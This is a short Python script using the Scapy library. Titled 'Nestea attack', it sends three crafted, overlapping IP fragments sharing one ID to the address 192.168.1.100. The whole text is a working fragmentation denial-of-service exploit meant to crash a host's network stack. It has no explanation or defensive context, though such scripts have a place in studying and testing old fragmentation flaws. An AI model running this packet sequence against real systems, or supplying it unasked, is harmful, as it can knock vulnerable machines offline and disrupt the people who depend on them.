#Nestea attack

from scapy.all import *
ip='192.168.1.100'

send(IP(dst=ip, id=42, flags="MF")/UDP()/("X"*10))
send(IP(dst=ip, id=42, frag=48)/("X"*116))
send(IP(dst=ip, id=42, flags="MF")/UDP()/("X"*224))